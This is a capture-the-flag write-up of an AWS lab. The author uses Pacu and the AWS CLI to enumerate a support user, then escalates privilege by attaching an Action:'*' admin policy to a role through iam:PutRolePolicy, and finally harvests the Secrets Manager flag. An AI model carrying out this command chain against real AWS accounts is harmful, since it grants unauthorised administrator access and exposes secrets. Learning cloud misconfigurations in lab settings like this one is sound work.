# Challenge Lab Name: `IAM PutRolePolicy PrivEsc`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://cybr.com" target="_blank" title="Open Cybr Labs Platform"><img src="https://img.shields.io/badge/Cybr_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Cybr Labs Platform Link"></a> &nbsp;
>
>AWS IAM roles are incredibly useful and powerful, and you can assume them to receive permissions either within your account, or even for cross-account access. Your lab user has access to perform support functions by assuming roles with AssumeRole, including a role that has access to a non-sensitive S3 bucket containing generic files for an application that you support. However, this lab has been misconfigured to grant you iam:PutRolePolicy. Leverage this misconfiguration to give that role additional permissions to access secrets in Secrets Manager. You've captured the flag when you've successfully decoded the secret string stored in Secrets Manager and you're able to read it in plaintext.

</details>

<details open>
<summary><b>Initial Access & Enumeration</b></summary>

The initial access were AWS IAM credentials that I configured into an AWS profile by running the command `aws configure --profile put`. I checked who I was with the new credentials by running the command below. 

```bash
└─$ aws sts get-caller-identity --profile put 
{
    "UserId": "AIDATE5RYMTORFU637J6U",
    "Account": "216731772125",
    "Arn": "arn:aws:iam::216731772125:user/Support-Mike"
}
```

From the output I could see that I was now the IAM user **Support-Mike**. The next step was to see what permissions I had with this user. Checking for any managed policies attached to this user I got an `AccessDenied` error. When I checked for inline policies attached to this user there was none listed. 

#### Using Pacu for Enumeration

To automate the process of finding what permissions that the user had I opened up [Pacu](https://github.com/RhinoSecurityLabs/pacu), an AWS exploitation framework. The next thing I did was run the **iam__bruteforce_permissions** module in Pacu that would make every API call to see what I was able to do.

```bash
Pacu (put:imported-put) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
...
Pacu (put:imported-put) > data iam
{
  "permissions": {
    "allow": [
      "iam:GetUser",
      "iam:ListUserPolicies",
      "iam:ListGroupsForUser",
      "iam:ListGroupPolicies",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "iam:ListUsers",
      "iam:ListPolicies",
      "iam:ListRoles",
      "iam:GetUser",
      "iam:ListGroups",
      "dynamodb:DescribeEndpoints"
    ],
    "deny": []
  }
}
```

From the output I could see that I had permission to list groups and their policies, so I ran the **iam__enum_users_roles_policies_groups** module next.

```bash
Pacu (put:imported-put) > run iam__enum_users_roles_policies_groups 
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 1 users
[iam__enum_users_roles_policies_groups] Found 20 roles
[iam__enum_users_roles_policies_groups] Found 2 policies
[iam__enum_users_roles_policies_groups] Found 1 groups
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  1 Users Enumerated
  20 Roles Enumerated
  2 Policies Enumerated
  1 Groups Enumerated
  IAM resources saved in Pacu database.
```

After the module completed I could see that there were a few things found like 1 user group, 20 roles, and 2 policies. The next step was to enumerate permissions by running the **iam__enum_permissions** module, shown below. 

```bash
Pacu (put:imported-put) > run iam__enum_permissions 
  Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   Support-Mike...
...
[iam__enum_permissions] MODULE SUMMARY:

   0 Confirmed permissions for 0 user(s).
   0 Confirmed permissions for 0 role(s).
  18 Unconfirmed permissions for user: Support-Mike.
   0 Unconfirmed permissions for 0 role(s).
Type 'whoami' to see detailed list of permissions.
```

After the module finished I ran `whoami` in the Pacu environment to see what permissions that the initial IAM user had. 

```bash
    "Allow": {
      "iam:putrolepolicy": {
        "Resources": [
          "arn:aws:iam::216731772125:role/SupportRole"
        ],
        "Conditions": [
          {
            "ArnEquals": {
              "aws:PrincipalARN": "arn:aws:iam::216731772125:user/Support-Mike"
            }
          }
        ]
      },
      "sts:assumerole": {
        "Resources": [
          "arn:aws:iam::216731772125:role/SupportRole"
        ]
      },
```

The output from the module showed me that as the intial access IAM user I was allowed to assume the role of **SupportRole**. I could also see from the output that I would be able to use `iam:putrolepolicy` on the role **SupportRole** which would allow me to add a custom IAM role policy to the role. 

<details>
<summary><b>Pacu `whoami` Long Format</b></summary>

```bash
Pacu (put:imported-put) > whoami
{
  "UserName": "Support-Mike",
  "RoleName": null,
  "Arn": "arn:aws:iam::216731772125:user/Support-Mike",
  "AccountId": "216731772125",
  "UserId": "AIDATE5RYMTORFU637J6U",
  "Roles": null,
  "Groups": [
    {
      "Path": "/",
      "GroupName": "Support",
      "GroupId": "AGPATE5RYMTO3RINKWUN4",
      "Arn": "arn:aws:iam::216731772125:group/Support",
      "CreateDate": "Thu, 12 Nov 2026 04:30:58",
      "Policies": [
        {
          "PolicyName": "Support-policy"
        }
      ]
    }
  ],
  "Policies": [],
  "AccessKeyId": "AK************",
  "SecretAccessKey": "Bfu3K0s**************************",
  "SessionToken": null,
  "KeyAlias": "imported-put",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {
      "iam:putrolepolicy": {
        "Resources": [
          "arn:aws:iam::216731772125:role/SupportRole"
        ],
        "Conditions": [
          {
            "ArnEquals": {
              "aws:PrincipalARN": "arn:aws:iam::216731772125:user/Support-Mike"
            }
          }
        ]
      },
      "sts:assumerole": {
        "Resources": [
          "arn:aws:iam::216731772125:role/SupportRole"
        ]
      },
      "iam:listroles": {
        "Resources": [
          "*"
        ]
      },
      "iam:listusers": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuserpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgroupsforuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicyversion": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicyversions": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrolepolicy": {
        "Resources": [
          "arn:aws:iam::216731772125:role/SupportRole",
          "*"
        ]
      },
      "iam:getrole": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgrouppolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getgrouppolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listuserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgroups": {
        "Resources": [
          "*"
        ]
      },
      "iam:listrolepolicies": {
        "Resources": [
          "arn:aws:iam::216731772125:role/SupportRole"
        ]
      }
    },
    "Deny": {}
  }
}
```

</details>

If I weren't using Pacu, one way to find this would have been to run the command below, showing me what groups the initial access user was added to. 

```bash
└─$ aws iam list-groups-for-user --user-name Support-Mike --profile put
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "Support",
            "GroupId": "AGPATE5RYMTO3RINKWUN4",
            "Arn": "arn:aws:iam::216731772125:group/Support",
            "CreateDate": "2026-11-12T04:30:58+00:00"
        }
    ]
}
```

From the output I could see that the IAM user was a part of the **Support** group, so the next step was to see what policies were attached to the group by running the command below. 

```bash
└─$ aws iam list-group-policies --group-name Support --profile put
{
    "PolicyNames": [
        "Support-policy"
    ]
}
```

In the output I could see that there was a policy **Support-Policy** attached to the group, so I checked what statements it contained by running the command below. 

```bash
└─$ aws iam get-group-policy --group-name Support --policy-name Support-policy --profile put
{
    "GroupName": "Support",
    "PolicyName": "Support-policy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:PutRolePolicy"
                ],
                "Condition": {
                    "ArnEquals": {
                        "aws:PrincipalARN": "arn:aws:iam::216731772125:user/Support-Mike"
                    }
                },
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::216731772125:role/SupportRole"
                ],
                "Sid": "AllowPutRolePolicy"
            },
            {
                "Action": [
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::216731772125:role/SupportRole"
                ],
                "Sid": "AllowAssumeSupportRole"
            },
            {
                "Action": [
                    "iam:Listroles"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "AllowListRoles"
            },
            {
                "Action": [
                    "iam:ListGroupPolicies",
                    "iam:ListPolicies",
                    "iam:ListPolicyVersions",
                    "iam:ListUserPolicies",
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListGroupsForUser",
                    "iam:GetPolicy",
                    "iam:GetPolicyVersion",
                    "iam:GetRole",
                    "iam:GetRolePolicy",
                    "iam:GetUser",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": [
                    "iam:ListRolePolicies",
                    "iam:GetRolePolicy"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::216731772125:role/SupportRole"
                ],
                "Sid": "AllowListRolePolicies"
            }
        ]
    }
}
```

From the output I could see that this is how the IAM user had more permissions found than originally found in the Pacu session when running the **iam__bruteforce_permissions** module. 

</details>

<details open>
<summary><b>S3 Enumeration Using Assumed IAM Role</b></summary>

Using the same intial access credentials I checked what policies were attached to the IAM role, which is where I found the **AccessNOTSensitiveBucket** policy, shown below.

```bash
└─$ aws iam list-role-policies --role-name SupportRole --profile put   
{
    "PolicyNames": [
        "AccessNOTSensitiveBucket"
    ]
}
```

Since I wanted to check what statements were inside the policy document I ran the command shown below. This showed me that the IAM role had permission to list S3 buckets in the AWS account, and get objects from the S3 bucket **cybr-operations-data-216731772125/**. 

```bash
└─$ aws iam get-role-policy --policy-name AccessNOTSensitiveBucket --role-name SupportRole --profile put
{
    "RoleName": "SupportRole",
    "PolicyName": "AccessNOTSensitiveBucket",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::cybr-operations-data-216731772125",
                "Sid": "AllowListNOTSensitiveBucket"
            },
            {
                "Action": [
                    "s3:GetObject"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::cybr-operations-data-216731772125/*",
                "Sid": "AllowGetObjectsInNOTSensitiveBucket"
            },
            {
                "Action": [
                    "s3:ListAllMyBuckets",
                    "s3:GetBucketLocation"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "AllowS3List"
            }
        ]
    }
}
```

The next step was to assume the **SupportRole** role, which I did by running the command `aws sts assume-role --role-arn arn:aws:iam::216731772125:role/SupportRole --role-session-name Support --profile put`. This outputted temporary credentials which I configured in an AWS profile named **support**. 

```bash
└─$ aws sts get-caller-identity --profile support
{
    "UserId": "AROATE5RYMTORT6KK24ED:Support",
    "Account": "216731772125",
    "Arn": "arn:aws:sts::216731772125:assumed-role/SupportRole/Support"
}
```

#### S3 Enumeration

Since I knew from enumerating the policies attached to this role, I would know have permission to list S3 buckets in the AWS account.

```bash
└─$ aws s3 ls --profile support                                                  
2026-11-11 20:30:59 cybr-operations-data-216731772125
```

Since the S3 bucket shown matched the one in the policy, I checked to see if there were any objects in the S3 bucket that could possibly be used for further movement into the AWS account. 

```bash
└─$ aws s3 ls cybr-operations-data-216731772125 --profile support                
2026-11-11 20:31:00         70 favicon.png
2026-11-11 20:31:00        301 index.html
2026-11-11 20:31:00        142 style.css
...
...
...
└─$ aws s3 cp s3://cybr-operations-data-216731772125/index.html . --profile support
download: s3://cybr-operations-data-216731772125/index.html to ./index.html
```

Since there was nothing valuable in the S3 bucket I stopped focusing on it and looked into how to attach a policy to a role using the `iam:PutRolePolicy` permission found earlier. 

</details>


<details open>
<summary><b>Privilege Escalation & AWS Secrets Exfiltration</b></summary>

#### `PutRolePolicy`

In a file named **admin.json** I copied and pasted the policy template shown below, which is a policy that would basically have `AdministratorAccess`, and run all commands on any resource if I had permission to do so. 

```json
{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }
```

After creating this file and saving it, I attached this document as a role policy by running the command below. This command will not provide any output. 

```bash
└─$ aws iam put-role-policy --role-name SupportRole --policy-name AdminAccess --policy-document file://admin.json --profile put
```

This command worked because Since the intial access user had permission to add this policy specifically to the IAM role **SupportRole**.

With the new policy attached to this role, I went back to Pacu and imported the new AWS profile by running the command below. 

```bash
Pacu (put:imported-put) > import_keys support
  Imported keys as "imported-support"
```

Since I now basically had **AdministratorAccess**, I went ahead and used the **secrets__enum** module, shown in the command below, to enumerate for any secrets that were in the AWS Secrets Manager for this AWS account. 

```bash
Pacu (put:imported-support) > run secrets__enum --secrets-manager --region us-east-1
  Running module secrets__enum...
[secrets__enum] Starting region us-east-1...
[secrets__enum]  Found secret: iam-putrolepolicy-final_flag
[secrets__enum] Probing Secret: iam-putrolepolicy-final_flag
[secrets__enum] secrets__enum completed.

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
'    0 Parameter(s) were found in AWS Systems Manager Parameter Store    
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the values
```

Since the challenge flag is in the secret I went ahead and censored it out of the writeup. But navigating to the session and the secrets manager directory I was able to see a secret in the AWS Secrets Manager. 

```bash
└─$ cat ~/.local/share/pacu/put/downloads/secrets/secrets_manager/secrets.txt 
iam-putrolepolicy-final_flag:{"vault-password": "Y3lic************Q4OA=="}
```

From the output of the `secrets.txt` file I could see that there was a password key with a value that was encoded in Base64. I then decoded the Base64 string with [CyberChef](https://gchq.github.io/CyberChef/), and I was able to get the challenge flag. 

</details>

<details open>
<summary><b>Impact & Reflection</b></summary>

This challenge went over how the `iam:PutRolePolicy` action could allow a relatively low privileged user to gain access to secrets from the AWS account. This attack path was easy because the intial access IAM user was a part of the **Support** group which gave the user the permission for the action, and the user had permission to assume the role of **SupportRole**. 

I could imagine in a real world scenario that a malicious actor finding AWS credentials in source code or some other way would exploit this security misconfiguration to spin up resources for themselves or jeapordize more infrastructure. 

</details>
